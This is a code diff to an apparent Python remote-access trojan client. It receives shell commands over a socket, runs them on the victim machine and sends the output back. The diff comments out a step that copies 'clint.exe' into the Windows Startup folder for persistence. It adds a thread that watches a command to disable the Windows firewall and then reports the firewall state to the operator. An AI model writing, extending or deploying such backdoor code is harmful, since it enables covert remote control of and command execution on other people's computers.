@@ -6,18 +6,18 @@ import time
 import sys
 import paramiko as pa
 import ssl
-
+import threading as thr
 try:
     
- 
+    
     pwd=os.getcwd()
     pla=sys.platform
 
-    if pla=="win32" or pla=="win64":
-        try:
-            shutil.move("clint.exe",r"C:\Users\ibrah\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
-        except Exception:
-            pass
+    # if pla=="win32" or pla=="win64":
+    #     try:
+    #         shutil.move("clint.exe",r"C:\Users\ibrah\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+    #     except Exception:
+    #         pass
      
     
 
@@ -132,6 +132,7 @@ try:
 
 
                             elif v=="cmd":
+                                ee=0
                                 if pla=='linux' :
                                     while True:
 
@@ -155,6 +156,21 @@ try:
                                 elif pla=='win32' or pla=='win64':
                                     while True:
                                         command=sst.recv(4096).decode('utf-8')
+                                        
+                                        if command=="netsh advfirewall set allprofiles state offf":
+                                            
+                                            def stop():
+                                                global qw,ee
+                                                while True:
+                                                    time.sleep(10)
+                                                    qw=sp.run("netsh advfirewall show allprofiles",shell=True,text=True,capture_output=True)
+                                                    qw=qw.stdout
+                                                    if len(qw)==2094:
+                                                        
+                                                        ee=1
+                                                        break
+                                            thr.Thread(target=stop).start()
+                                            
                                         if command=="exit": 
                                             break
 
@@ -172,8 +188,12 @@ try:
                                                 continue
                                             if command=="cd.." or command.startswith("cd "):
                                                 continue
-                                            vvv=fvf.stdout
-                                            sst.sendall(vvv.encode('utf-8'))
+                                            if ee==1:
+                                                sst.sendall("firewall is on".encode('utf-8'))
+                                                continue
+                                            if ee==0:
+                                                vvv=fvf.stdout
+                                                sst.sendall(vvv.encode('utf-8'))
                                         elif command=="cd..":
                                             nvn=pwd
                                             qnvn=nvn.split('\\')
@@ -200,8 +220,12 @@ try:
                                             command=str(command)
                                             if command=="cd.." or command.startswith("cd "):
                                                 continue
-                                            vvv=gvg.stdout
-                                            sst.sendall(vvv.encode('utf-8'))
+                                            if ee==1:
+                                                sst.sendall("firewall is on".encode('utf-8'))
+                                                continue
+                                            if ee==0:
+                                                vvv=gvg.stdout
+                                                sst.sendall(vvv.encode('utf-8'))
                                         else:
                                             wvw=sp.run(command,cwd=pwd,text=True,shell=True,capture_output=True)
                                             
@@ -212,8 +236,14 @@ try:
                                             if command=="cd.." or command.startswith("cd "):
                                                 continue
                                             vvv=wvw.stdout
-                                            sst.sendall(vvv.encode('utf-8'))
-
+                                            
+                                            if ee==1:
+                                                sst.sendall("firewall is on".encode('utf-8'))
+                                                
+                                                continue
+                                            if ee==0:
+                                                
+                                                sst.sendall(vvv.encode('utf-8'))
                             elif v=="downlod":
                                 command=sst.recv(4096).decode('utf-8')
                                 if command=="wevall":
